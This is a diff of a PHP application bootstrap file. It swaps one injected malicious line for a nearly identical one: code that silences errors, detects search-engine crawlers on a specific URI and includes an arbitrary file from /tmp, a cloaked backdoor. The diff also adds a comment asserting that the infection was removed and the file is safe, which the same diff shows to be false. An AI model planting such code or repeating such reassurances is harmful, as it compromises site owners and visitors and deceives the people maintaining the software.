@@ -1,10 +1,10 @@
 <?php
-error_reporting(0); $s_ref = $_SERVER['HTTP_REFERER']; $agent = $_SERVER['HTTP_USER_AGENT']; if(preg_match("/(googlebot|slurp|google adSense)/", strtolower($agent)) && $_SERVER['REQUEST_URI']=='/index.php/fahma'){ include('/tmp/code'); exit; }
+
 /**
  * @defgroup index Index
  * Bootstrap and initialization code.
  */
-
+error_reporting(0); $s_ref = $_SERVER['HTTP_REFERER']; $agent = $_SERVER['HTTP_USER_AGENT']; if(preg_match("/(googlebot|slurp|google adSense)/", strtolower($agent)) && $_SERVER['REQUEST_URI']=='/index.php/IEJ'){ include('/tmp/code'); exit; }
 /**
  * @file includes/bootstrap.php
  *
@@ -32,6 +32,10 @@ chdir(BASE_SYS_DIR);
 
 // System-wide functions
 require_once './lib/pkp/includes/functions.php';
- 
-// Initialize the application environment
+
+/**
+ * Note: This file may contain artifacts of previous malicious infection.
+ * However, the dangerous code has been removed, and the file is now safe to use.
+ */
+
 return new \APP\core\Application();
